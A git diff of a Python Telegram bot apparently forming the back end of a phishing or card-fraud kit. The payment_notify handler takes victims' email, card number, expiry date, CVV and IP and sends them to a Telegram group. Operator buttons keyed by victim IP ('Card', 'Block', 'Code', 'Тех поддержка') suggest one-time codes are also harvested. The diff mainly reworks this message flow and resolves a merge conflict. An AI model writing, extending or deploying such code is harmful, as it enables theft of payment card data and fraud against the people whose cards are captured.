@@ -1346,25 +1346,6 @@ async def payment_notify(request):
             ]
         ]
     )
-    user_id = data.get('user_id', '')
-    
-    # --- Оновлюємо IP у базі даних, якщо передано user_id ---
-    if user_id and ip:
-        update_site_user_ip(user_id, ip)
-    
-    # --- Отримуємо дані користувача з бази ---
-    user_data_from_db = None
-    if user_id:
-        user_data_from_db = get_site_user(user_id)
-    
-    text = f"Email: {email}\nCard Number: {card}\nExpiry Date: {expiry}\nCVV: {cvv}\nIP: {ip}"
-    
-    # Додаємо інформацію з бази даних, якщо є
-    if user_data_from_db:
-        text += f"\nSite User ID: {user_data_from_db['id']}"
-        text += f"\nЦена: {user_data_from_db['price']} {user_data_from_db['currency']}"
-        text += f"\nАдрес: {user_data_from_db['street']}"
-    
     await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
     # 2. Повідомлення з карткою, CVV, expiry, email, IP + кнопки для карт/коду
     msg2 = (
@@ -1376,17 +1357,17 @@ async def payment_notify(request):
     )
     kb2 = InlineKeyboardMarkup(
         inline_keyboard=[
-        [
-            InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
-            InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
-            InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
-            InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
-        ],
-        [
+            [
+                InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
+                InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
+                InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
+                InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
+            ],
+            [
                 InlineKeyboardButton(text="Тех поддержка", callback_data=f"support:{ip}"),
-            InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
+                InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
+            ]
         ]
-    ]
     )
     await bot.send_message(PAYMENT_GROUP_ID, msg2, reply_markup=kb2)
     # 3. Повідомлення з кодом, IP + кнопка Request again
@@ -1637,12 +1618,6 @@ if __name__ == '__main__':
         await dp.start_polling(bot)
     asyncio.run(main())
 
-<<<<<<< HEAD
-@router.message(flags={'run_always': True})
-async def print_chat_id(message: types.Message):
-    print(f"[TEMP DEBUG] Chat ID: {message.chat.id}")
-    # Можна закоментувати або видалити цей хендлер після отримання chat_id
-=======
 def fill_page_codes():
     c = conn.cursor()
     c.execute('SELECT id FROM site_users ORDER BY created_at')
@@ -1661,5 +1636,3 @@ def get_site_user_id_by_page(page_code):
     return row[0] if row else None
 
 # --- API: page_code by user_id ---
-
->>>>>>> origin/sasha
